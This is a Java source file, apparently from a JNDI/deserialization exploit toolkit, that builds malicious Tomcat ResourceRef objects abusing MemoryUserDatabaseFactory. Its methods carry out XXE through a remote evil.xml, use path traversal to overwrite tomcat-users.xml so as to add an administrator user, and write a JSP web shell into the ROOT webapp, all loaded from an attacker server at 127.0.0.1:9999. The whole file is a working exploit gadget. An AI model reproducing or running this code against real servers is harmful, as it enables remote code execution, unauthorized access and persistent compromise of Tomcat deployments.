package xyz.eki.marshalexp.gadget.jndi.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import static xyz.eki.marshalexp.jndi.rmi.AttackWithTomcatBeanFactory.CreateDirWithH2;

/*
XXE or RCE
 */
public class GTomcatMemoryUserDatabaseFactory {
    public static void main(String[] args) throws Exception {
        CreateDirWithH2();
        AttackWithAddTomcatUser();
        AttackWithWriteWebShell();
    }

    public static ResourceRef AttackWithXXE(){
        ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "",
                true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
        ref.add(new StringRefAddr("pathname", "http://127.0.0.1:9999/evil.xml"));
        return ref;
    }

    public static ResourceRef AttackWithAddTomcatUser(){
        ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "",
                true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
        ref.add(new StringRefAddr("pathname", "http://127.0.0.1:9999/../../conf/tomcat-users.xml"));
        ref.add(new StringRefAddr("readonly", "false"));
        return ref;
    }

    public static ResourceRef AttackWithWriteWebShell(){
        ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "",
                true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
        ref.add(new StringRefAddr("pathname", "http://127.0.0.1:9999/../../webapps/ROOT/test.jsp"));
        ref.add(new StringRefAddr("readonly", "false"));
        return ref;
    }
}
